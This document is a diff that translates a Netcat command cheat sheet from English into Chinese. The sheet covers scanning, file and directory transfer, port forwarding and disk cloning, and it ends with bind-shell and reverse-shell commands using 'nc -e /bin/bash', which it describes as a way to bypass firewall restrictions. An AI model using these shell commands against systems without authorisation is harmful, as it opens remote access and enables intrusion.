@@ -9,61 +9,61 @@ tags:
   - network
   - traffic
 categories:
-  - Linux Command
-intro: This cheat sheet provides various for using Netcat on both Linux and Unix.
+  - Linux 命令
+intro: 本速查表提供了在 Linux 和 Unix 上使用 Netcat 的各种方法。
 plugins:
   - copyCode
 ---
 
-## Getting Started {.cols-5}
+## 入门 {.cols-5}
 
-### Usage {.col-span-2}
+### 用法 {.col-span-2}
 
-Connect to a host located anywhere
-
-```shell script
-$ nc [options] [host] [port]
-```
-
-Listen for incoming connections
+连接到任何位置的主机
 
 ```shell script
-$ nc -lp port [host] [port]
+$ nc [选项] [主机] [端口]
 ```
 
-### Option examples {.col-span-3 .row-span-2}
+监听传入连接
 
-| Option | Description                | Example                                  |
-| ------ | -------------------------- | ---------------------------------------- |
-| `-h`   | nc -h                      | Help                                     |
-| `-z`   | nc -z 192.168.1.9 1-100    | Port scan for a host or IP address       |
-| `-v`   | nc -zv 192.168.1.9 1-100   | Provide verbose output                   |
-| `-n`   | nc -zn 192.168.1.9 1-100   | Fast scan by disabling DNS resolution    |
-| `-l`   | nc -lp 8000                | TCP Listen mode _(for inbound connects)_ |
-| `-w`   | nc -w 180 192.168.1.9 8000 | Define timeout value                     |
-| `-k`   | nc -kl 8000                | Continue listening after disconnection   |
-| `-u`   | nc -u 192.168.1.9 8000     | Use UDP instead of TCP                   |
-| `-q`   | nc -q 1 192.168.1.9 8000   | Client stay up after EOF                 |
-| `-4`   | nc -4 -l 8000              | IPv4 only                                |
-| `-6`   | nc -6 -l 8000              | IPv6 only                                |
+```shell script
+$ nc -lp 端口 [主机] [端口]
+```
 
-### Chat client-server {.col-span-2}
+### 选项示例 {.col-span-3 .row-span-2}
 
-Server (192.168.1.9)
+| 选项   | 描述                                   | 示例                                     |
+| ------ | -------------------------------------- | ---------------------------------------- |
+| `-h`   | nc -h                                  | 帮助                                     |
+| `-z`   | nc -z 192.168.1.9 1-100                | 扫描主机或 IP 地址的端口                 |
+| `-v`   | nc -zv 192.168.1.9 1-100               | 提供详细输出                             |
+| `-n`   | nc -zn 192.168.1.9 1-100               | 通过禁用 DNS 解析进行快速扫描            |
+| `-l`   | nc -lp 8000                            | TCP 监听模式 _(用于入站连接)_            |
+| `-w`   | nc -w 180 192.168.1.9 8000             | 定义超时值                               |
+| `-k`   | nc -kl 8000                            | 断开连接后继续监听                       |
+| `-u`   | nc -u 192.168.1.9 8000                 | 使用 UDP 而不是 TCP                      |
+| `-q`   | nc -q 1 192.168.1.9 8000               | 客户端在 EOF 后保持连接                  |
+| `-4`   | nc -4 -l 8000                          | 仅 IPv4                                  |
+| `-6`   | nc -6 -l 8000                          | 仅 IPv6                                  |
+
+### 聊天客户端-服务器 {.col-span-2}
+
+服务器 (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc 192.168.1.9 8000
 ```
 
-## Netcat Examples
+## Netcat 示例
 
-### Banner grabbing
+### Banner抓取
 
 ```shell script
 $ nc website.com 80
@@ -71,165 +71,164 @@ GET index.html HTTP/1.1
 HEAD / HTTP/1.1
 ```
 
-or
+或
 
 ```shell script
 echo "" | nc -zv -wl 192.168.1.1 801-805
 ```
 
-### Port scanning
+### 端口扫描
 
-Scan ports between 21 to 25
+扫描 21 到 25 之间的端口
 
 ```shell script
 $ nc -zvn 192.168.1.1 21-25
 ```
 
-Scan ports 22, 3306 and 8080
+扫描端口 22、3306 和 8080
 
 ```shell script
 $ nc -zvn 192.168.1.1 22 3306 8080
 ```
 
-### Proxy and port forwarding
+### 代理和端口转发
 
 ```shell script
 $ nc -lp 8001 -c "nc 127.0.0.1 8000"
 ```
 
-or
+或
 
 ```shell script
 $ nc -l 8001 | nc 127.0.0.1 8000
 ```
 
-Create a tunnel from one local port to another
+创建一个从一个本地端口到另一个本地端口的隧道
 
-### Download file
+### 下载文件
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000 < file.txt
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc -nv 192.168.1.9 8000 > file.txt
 ```
 
-Suppose you want to transfer a file “file.txt” from server A to client B.
+假设您想将文件 “file.txt” 从服务器 A 传输到客户端 B。
 
-### Upload file
+### 上传文件
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000 > file.txt
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc 192.168.1.9 8000 < file.txt
 ```
 
-Suppose you want to transfer a file “file.txt” from client B to server A:
+假设您想将文件 “file.txt” 从客户端 B 传输到服务器 A：
 
-### Directory transfer
+### 目录传输
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ tar -cvf – dir_name | nc -l 8000
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc -n 192.168.1.9 8000 | tar -xvf -
 ```
 
-Suppose you want to transfer a directory over the network from A to B.
+假设您想通过网络将目录从 A 传输到 B。
 
-### Encrypt transfer {.col-span-2}
+### 加密传输 {.col-span-2}
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ openssl enc -des3 -in file.txt -pass pass:password | nc -l 8000
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc 192.168.1.9 8000 | openssl enc -des3 -d -pass pass:password -out file.txt
 ```
 
-Encrypt data before transfering over the network
+在通过网络传输数据之前对其进行加密
 
-### Clones
+### 克隆
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ dd if=/dev/sda | nc -l 8000
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc -n 192.168.1.9 8000 | dd of=/dev/sda
 ```
 
-Cloning a linux PC is very simple. Suppose your system disk is /dev/sda
+克隆 Linux PC 非常简单。假设您的系统磁盘是 /dev/sda
 
-### Video streaming
+### 视频流
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ cat video.avi | nc -l 8000
 ```
 
-Client
+客户端
 
 ```shell script {.wrap}
 $ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
 ```
 
-Streaming video with netcat
+使用 netcat 进行视频流传输
 
-### Remote shell
+### 远程 Shell
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000 -e /bin/bash
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc 192.168.1.9 8000
 ```
 
-We have used remote Shell using the telnet and ssh but what if they are not installed and we do not have the permission
-to install them, then we can create remote shell using netcat also.
+我们已经使用 telnet 和 ssh 实现了远程 Shell，但是如果它们没有安装并且我们没有权限安装它们，那么我们也可以使用 netcat 创建远程 Shell。
 
-### Reverse shell
+### 反向 Shell
 
-Server (192.168.1.9)
+服务器 (192.168.1.9)
 
 ```shell script
 $ nc -lv 8000
 ```
 
-Client
+客户端
 
 ```shell script
 $ nc 192.168.1.9 8000 -v -e /bin/bash
 ```
 
-Reverse shells are often used to bypass the firewall restrictions like blocked inbound connections
+反向 Shell 通常用于绕过防火墙限制，例如阻止入站连接
